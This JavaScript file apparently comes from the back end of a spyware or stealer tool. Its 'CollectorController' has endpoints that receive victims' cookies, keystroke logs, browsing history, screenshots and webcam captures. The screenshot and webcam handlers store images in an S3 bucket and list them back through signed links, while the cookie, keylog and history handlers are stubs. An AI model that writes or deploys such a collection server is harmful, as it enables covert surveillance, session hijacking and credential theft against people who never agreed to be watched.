import {s3Client} from "../http_server.js";
import {GetObjectCommand, ListObjectsCommand, PutObjectCommand} from "@aws-sdk/client-s3";
import {DateTime} from "luxon";
import { v4 as uuidv4 } from 'uuid';
import {getSignedUrl} from "@aws-sdk/s3-request-presigner";

/**
 * Class representing a controller for collecting data.
 */
class CollectorController {
    /**
     * Save cookies from the request body.
     * @param {Object} req - The request object.
     * @param {Object} res - The response object.
     * @param {Function} _next - The next middleware function.
     * @returns {Object} The response object with the status of the operation.
     */
    async saveCookies(req, res, _next) {
        const cookies = req.body;
        // TODO: do something with the cookies
        res.status(200).send({status: 'Cookies received'});
    }

    /**
     * Save keys from the request body.
     * @param {Object} req - The request object.
     * @param {Object} res - The response object.
     * @param {Function} _next - The next middleware function.
     * @returns {Object} The response object with the status of the operation.
     */
    async saveKeys(req, res, _next) {
        // TODO: do something with the keys
        return res.status(200).send({status: 'Key logs received'});
    }

    /**
     * Save history from the request body.
     * @param {Object} req - The request object.
     * @param {Object} res - The response object.
     * @param {Function} _next - The next middleware function.
     * @returns {Object} The response object with the status of the operation.
     */
    async saveHistory(req, res, _next) {
        const history = req.body;
        // TODO: do something with the history
        res.status(200).send({status: 'History received'});
    }

    /**
     * Save screenshot from the request body and upload it to AWS S3.
     * @param {Object} req - The request object.
     * @param {Object} res - The response object.
     * @param {Function} _next - The next middleware function.
     * @returns {Object} The response object with the status of the operation.
     */
    async saveScreenshot(req, res, _next) {
        if (!req.body.dataUrl) {
            return res.status(400).send({status: 'Bad request'})
        }
        // Convert the base64 data URL to a buffer
        const buff = Buffer.from(req.body.dataUrl.replace('data:image/jpeg;base64,', ''), 'base64');

        const imgName = `${uuidv4()}-${DateTime.now().toFormat('yyyy-MM-dd_HH-mm-ss')}`

        // Create a PutObjectCommand with the image buffer
        const command = new PutObjectCommand({
            Bucket: process.env.AWS_S3_BUCKET,
            Key: `screenshots/${imgName}.jpeg`,
            Body: buff,
        });

        try {
            const response = await s3Client.send(command);
            console.log(response);
        } catch (err) {
            console.error(err);
        }

        return res.status(200).send({status:'Screenshot received'})
    }

    /**
     * List all screenshots from AWS S3.
     * @param {Object} req - The request object.
     * @param {Object} res - The response object.
     * @param {Function} _next - The next middleware function.
     * @returns {Object} The response object with the list of screenshots.
     */
    async listScreenshots(req, res, _next) {
        const result = []

        // List all objects from the "screenshot" subpath
        let contents = [];
        const {Contents} = await s3Client.send(new ListObjectsCommand({Bucket: process.env.AWS_S3_BUCKET, Prefix: 'screenshots/'}))

        if (Contents) {
            contents = Contents;
        }

        // Parse the response and generate a signed URL for each object
        for (const item of contents) {
            const command = new GetObjectCommand({Bucket: process.env.AWS_S3_BUCKET, Key: item.Key})
            const url = await getSignedUrl(s3Client, command, {expiresIn: 24 * 60 * 60})

            result.push({
                url,
                name: item.Key,
                createdAt: item.LastModified
            })
        }

        res.json(result)
    }

    /**
     * Save camera capture from the request body and upload it to AWS S3.
     * @param {Object} req - The request object.
     * @param {Object} res - The response object.
     * @param {Function} _next - The next middleware function.
     * @returns {Object} The response object with the status of the operation.
     */
    async saveCameraCapture(req, res, _next) {
        if (!req.body.dataUrl) {
            return res.status(400).send({status: 'Bad request'})
        }
        // Convert the base64 data URL to a buffer
        const buff = Buffer.from(req.body.dataUrl.replace('data:image/jpeg;base64,', ''), 'base64');

        const imgName = `${uuidv4()}-${DateTime.now().toFormat('yyyy-MM-dd_HH-mm-ss')}`

        // Create a PutObjectCommand with the image buffer
        const command = new PutObjectCommand({
            Bucket: process.env.AWS_S3_BUCKET,
            Key: `camera/${imgName}.jpeg`,
            Body: buff,
        });

        try {
            const response = await s3Client.send(command);
            console.log(response);
        } catch (err) {
            console.error(err);
        }

        return res.status(200).send({status:'Camera capture received'})
    }

    /**
     * List all camera captures from AWS S3.
     * @param {Object} req - The request object.
     * @param {Object} res - The response object.
     * @param {Function} _next - The next middleware function.
     * @returns {Object} The response object with the list of camera captures.
     */
    async listCameraCaptures(req, res, _next) {
        const result = []

        // List all objects from the "camera" subpath
        let contents = [];
        const {Contents} = await s3Client.send(new ListObjectsCommand({Bucket: process.env.AWS_S3_BUCKET, Prefix: 'camera/'}))

        if (Contents) {
            contents = Contents;
        }

        // Parse the response and generate a signed URL for each object
        for (const item of contents) {
            const command = new GetObjectCommand({Bucket: process.env.AWS_S3_BUCKET, Key: item.Key})
            const url = await getSignedUrl(s3Client, command, {expiresIn: 24 * 60 * 60})

            result.push({
                url,
                name: item.Key,
                createdAt: item.LastModified
            })
        }

        res.json(result)
    }
}


/**
 * A new instance of the CollectorController class.
 * @type {CollectorController}
 */
export default new CollectorController()
